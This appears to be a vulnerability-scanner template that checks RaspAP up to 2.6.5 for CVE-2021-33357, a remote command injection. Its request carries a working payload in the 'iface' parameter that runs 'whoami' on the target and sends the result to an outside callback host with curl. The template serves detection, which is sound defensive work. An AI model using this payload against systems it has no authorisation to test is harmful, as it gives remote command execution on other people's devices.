id: CVE-2021-33357
info:
  name: RaspAP <=2.6.5 - Remote Command Injection
  author: pikpikcu,pdteam
  severity: critical
  description: The RaspAP version2.6 to 2.6.5 vulnerability CVE-2021-33357 allows
    hackers to remotely execute arbitrary OS commands through the "iface" parameter
    in /ajax/networking/get_netcfg.php containing special characters.
  reference:
  - https://checkmarx.com/blog/chained-raspap-vulnerabilities-grant-root-level-access/
  - https://gist.github.com/omriinbar/52c000c02a6992c6ce68d531195f69cf
  - https://github.com/RaspAP/raspap-webgui
  - https://nvd.nist.gov/vuln/detail/CVE-2021-33357
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-33357
    cwe-id: CWE-78
  tags: cve,cve2021,rce,raspap,oast
  metadata:
    impact: The CVE-2021-33357 vulnerability in RaspAP allows unauthorized external
      parties to execute malicious commands on the system via a remote command injection
      attack.
    recommendation: It is recommended to immediately update to RaspAP version 2.6.6
      or above to address the CVE-2021-33357 vulnerability and prevent remote command
      injection.
requests:
- method: GET
  path:
  - '{{BaseURL}}/ajax/networking/get_netcfg.php?iface=;curl%20{{interactsh-url}}/`whoami`;'
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    words:
    - DHCPEnabled
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - GET \/([a-z-]+) HTTP
